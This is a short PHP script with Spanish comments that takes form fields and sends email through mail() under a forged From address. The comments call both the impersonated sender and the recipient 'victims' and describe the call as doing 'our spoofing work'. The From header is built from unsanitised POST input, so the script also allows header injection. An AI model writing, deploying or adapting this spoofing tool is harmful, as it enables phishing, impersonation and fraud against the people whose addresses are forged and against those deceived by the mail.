<?php

$nombre =  $_POST["nombre"]; 

$remitente =  $nombre . " " . $_POST["remitente"]; // Correo electrónico de la víctima de quien desea enviar un correo electrónico

$destinatario = $_POST["destinatario"]; //Correo electrónico de la víctima a quien desea enviar un correo electrónico

$asunto =  $_POST["asunto"];

$mensaje =  $_POST["mensaje"];



$headers = "From:" . $remitente; //."\n" . $remitente;

$mail = mail($destinatario,$asunto,$mensaje,$headers,$remitente); // Este mail () hará nuestro trabajo de spoofing

header("Location: enviado.html") 

?>